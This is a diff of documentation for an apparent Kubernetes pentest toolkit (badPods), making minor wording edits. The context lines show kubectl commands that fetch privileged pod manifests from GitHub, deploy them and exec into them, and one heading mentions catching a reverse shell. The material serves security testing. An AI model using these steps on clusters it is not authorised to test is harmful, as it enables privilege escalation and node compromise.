@@ -41,7 +41,7 @@ kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manife
 kubectl exec -it priv-exec-pod -- bash
 ```
 **Job, CronJob, Deployment, StatefulSet, ReplicaSet, ReplicationController, DaemonSet**       
-For the rest of the resource types, there is one added step. Once you create your deployment, cronjob, etc., you need to find the pods that were created by your respective resource type. 
+For the rest of the resource types, there is one added step. Once you create your deployment, cronjob, etc., you need to find the pods that were created by your respective resource. 
 
 ```bash
 kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv/[RESOURCE_TYPE]/priv-exec-[RESOURCE_TYPE].yaml 
@@ -49,7 +49,7 @@ kubectl get pods | grep priv-exec-[RESOURCE_TYPE]
 kubectl exec -it priv-exec-[RESOURCE_TYPE]-[ID] -- bash
 ```
 
-Keep in mind that if pod security policy blocks the pod, the resource type will still get created. The admission controller only blocks the pods that are created by the resource type. 
+*Keep in mind that if pod security policy blocks the pod, the resource type will still get created. The admission controller only blocks the pods that are created by the resource type.* 
 
 To troubleshoot a case where you don't see pods, use `kubectl describe`
 
@@ -58,7 +58,7 @@ kubectl describe priv-exec-[RESOURCE_TYPE]
 ```
 
 ## Reverse shell pods
-Create one or more of these resources and catch reverse shell
+Create one or more of these resources and catch the reverse shell
 
 **Generic resource type creation example***
 Replace [RESOURCE_TYPE] with deployment, statefulset, job, etc. 
